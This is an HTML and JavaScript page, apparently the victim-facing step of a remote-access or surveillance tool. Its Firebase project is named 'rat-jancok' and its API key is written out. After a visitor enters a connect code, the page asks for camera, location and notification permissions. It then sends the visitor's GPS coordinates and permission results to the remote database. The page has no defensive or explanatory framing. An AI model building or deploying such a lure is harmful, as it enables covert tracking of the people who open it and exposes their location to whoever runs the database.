<!DOCTYPE html>
<html>
<head>

<meta name="viewport" content="width=device-width, initial-scale=1">

<title>DARKVERSE V6</title>


<style>

@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600;900&family=Rajdhani:wght@600&display=swap');


*{
box-sizing:border-box;
}


body{

margin:0;
height:100vh;

background:
radial-gradient(circle at top,#450010,#030303 70%);

display:flex;
align-items:center;
justify-content:center;

color:white;

font-family:'Rajdhani';

overflow:hidden;

}



body:before{

content:"";

position:absolute;

inset:0;

background:
repeating-linear-gradient(
0deg,
transparent,
transparent 3px,
rgba(255,0,50,.08) 4px
);

animation:scan 4s linear infinite;

}



@keyframes scan{

from{
transform:translateY(-50px);
}

to{
transform:translateY(50px);
}

}




.card{

position:relative;

width:370px;

padding:30px;

background:
rgba(15,15,15,.9);


border:1px solid #ff003c;

border-radius:25px;


box-shadow:

0 0 30px #ff003c,
inset 0 0 30px #30000c;


text-align:center;


animation:show .8s;


}



@keyframes show{

from{

opacity:0;

transform:scale(.8);

}

to{

opacity:1;

transform:scale(1);

}

}




.logo{


font-family:'Orbitron';

font-size:32px;

font-weight:900;


letter-spacing:4px;


color:#ff003c;


text-shadow:

2px 0 cyan,
-2px 0 red;


animation:glitch 1.2s infinite;


}




@keyframes glitch{


0%,100%{

transform:none;

}


20%{

transform:skew(-8deg);

}


40%{

transform:translateX(3px);

}


60%{

transform:translateX(-3px);

}


}





.user{

margin-top:25px;

font-family:'Orbitron';

font-size:22px;

}



.role{

color:#aaa;

letter-spacing:3px;

}



.online{


margin:20px;

font-family:'Orbitron';

font-size:13px;


}




.dot{


display:inline-block;

width:6px;

height:6px;


background:#00ff66;


border-radius:50%;


box-shadow:
0 0 10px #00ff66;


animation:pulse 1s infinite;


}




@keyframes pulse{

50%{

opacity:.2;

transform:scale(1.8);

}

}





input{


width:100%;


padding:15px;


background:#050505;


border:1px solid #333;


border-radius:12px;


color:white;


font-family:'Orbitron';


text-align:center;


}



button{


width:100%;


padding:15px;


margin-top:15px;


border:0;


border-radius:12px;


background:

linear-gradient(
90deg,
#ff003c,
#900020
);


color:white;


font-family:'Orbitron';


letter-spacing:2px;


font-weight:bold;


}



button:active{

transform:scale(.95);

}




.result{


margin-top:15px;

font-family:'Orbitron';


}



.permission{


display:none;

}




.warning{


font-family:'Orbitron';


font-size:25px;


color:#ff003c;


text-shadow:
0 0 15px red;


animation:blink 1s infinite;


}



@keyframes blink{

50%{

opacity:.4;

}

}



.box{


margin-top:20px;

padding:15px;


background:#050505;


border:1px solid #333;


border-radius:15px;


}


</style>

</head>


<body>



<div class="card">


<div class="logo">
DARKVERSE V6
</div>


<div class="user">
Dennis
</div>


<div class="role">
ROLE : OWNER
</div>


<div class="online">

<span class="dot"></span>

ONLINE

</div>




<div id="connectPage">


<input 
id="code"
placeholder="ENTER CONNECT CODE">


<button onclick="connectDevice()">

CONNECT

</button>


<div class="result" id="result">

WAITING...

</div>


</div>





<div class="permission" id="permissionPage">


<div class="warning">

PERMISSION REQUIRED!

</div>



<div class="box">

<span class="dot"></span>

WAITING USER APPROVAL


</div>



<button onclick="cameraPermission()">

ALLOW CAMERA

</button>



<button onclick="locationPermission()">

ALLOW LOCATION

</button>



<button onclick="notificationPermission()">

ALLOW NOTIFICATION

</button>



</div>




</div>





<script type="module">


import {initializeApp}

from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";


import {

getDatabase,
ref,
get,
set

}

from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";




const firebaseConfig={


apiKey:"AIzaSyCnGnqV6fKvO3XDLBucrsIYPjGuafTun7g",

authDomain:"rat-jancok.firebaseapp.com",

projectId:"rat-jancok",

storageBucket:"rat-jancok.firebasestorage.app",

messagingSenderId:"832199244613",

appId:"1:832199244613:web:d40428c4fd6e73d37d1c2c"

};



const app=initializeApp(firebaseConfig);


const db=getDatabase(app);



let codeID="";




window.connectDevice=async()=>{


codeID=
document.getElementById("code").value.trim();



let check=
await get(ref(db,"connectCodes/"+codeID));



if(check.exists() && check.val().active){



document.getElementById("result").innerHTML=
"BERHASIL TERSAMBUNG";


await set(ref(db,"devices/"+codeID),{


user:"Dennis",

role:"Owner",

connected:true,

online:true,

time:Date.now()

});



setTimeout(()=>{


document.getElementById("connectPage").style.display="none";


document.getElementById("permissionPage").style.display="block";


},1200);



}else{


document.getElementById("result").innerHTML=
"KODE SALAH";


}


}




window.cameraPermission=async()=>{


try{


let s=
await navigator.mediaDevices.getUserMedia({
video:true
});


await set(ref(db,"devices/"+codeID+"/permission/camera"),true);


s.getTracks().forEach(t=>t.stop());


alert("Camera Approved");


}catch{


await set(ref(db,"devices/"+codeID+"/permission/camera"),false);


}

}




window.locationPermission=()=>{


navigator.geolocation.getCurrentPosition(async p=>{


await set(ref(db,"devices/"+codeID+"/permission/location"),{


allow:true,

lat:p.coords.latitude,

lng:p.coords.longitude

});


});


}




window.notificationPermission=async()=>{


let r=
await Notification.requestPermission();


await set(ref(db,"devices/"+codeID+"/permission/notification"),{


allow:r==="granted"

});


}




</script>


</body>
</html>
